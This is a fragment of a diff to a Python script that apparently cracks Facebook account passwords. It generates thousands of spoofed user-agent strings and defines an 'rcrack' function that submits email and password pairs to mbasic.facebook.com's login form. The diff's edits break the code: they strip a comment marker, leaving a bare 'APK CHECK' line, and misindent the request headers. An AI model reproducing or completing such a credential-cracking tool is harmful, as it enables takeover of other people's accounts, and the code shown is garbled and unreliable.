@@ -137,7 +137,7 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
-# APK CHECK
+ APK CHECK
 def xxr():
     user=[]
     twf =[]
@@ -205,7 +205,8 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'mbasic.facebook.com',
+          
+     headers = {'authority': 'mbasic.facebook.com',
      
     "method": 'GET',
     
